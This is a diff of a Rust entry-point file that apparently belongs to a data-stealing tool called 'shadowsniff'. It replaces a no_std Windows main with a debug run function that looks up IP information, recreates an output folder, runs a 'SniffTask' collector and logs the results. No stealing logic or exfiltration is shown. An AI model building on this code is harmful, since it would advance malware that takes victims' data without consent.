@@ -24,36 +24,33 @@
  * SOFTWARE.
  */
 
-#![no_std]
-#![no_main]
+use alloc::format;
+use collector::atomic::AtomicCollector;
+use collector::display::PrimitiveDisplayCollector;
+use filesystem::{FileSystem, FileSystemExt};
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use ipinfo::init_ip_info;
+use shadowsniff::SniffTask;
+use tasks::Task;
+use utils::log_debug;
 
-#![cfg_attr(debug_assertions, windows_subsystem = "console")]
-#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
-
-extern crate alloc;
-
-use crate::allocator::WinHeapAlloc;
-
-#[cfg(not(feature = "builder_build"))]
-mod debug;
-#[cfg(feature = "builder_build")]
-mod release;
-
-mod allocator;
-mod panic;
-
-#[global_allocator]
-static ALLOC: WinHeapAlloc = WinHeapAlloc;
-
-#[unsafe(no_mangle)]
-pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
-    cfg_if::cfg_if! {
-        if #[cfg(feature = "builder_build")] {
-            release::run();
-        } else {
-            debug::run();
-        }
+#[inline(always)]
+pub fn run() {
+    if !init_ip_info() {
+        panic!()
     }
-    
-    0
+
+    let fs = StorageFileSystem;
+    let out = &Path::new("output");
+    let _ = fs.remove_dir_all(out);
+    let _ = fs.mkdir(out);
+
+    let collector = AtomicCollector::default();
+
+    SniffTask::default().run(out, &fs, &collector);
+
+    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
+
+    log_debug!("{displayed_collector}");
 }
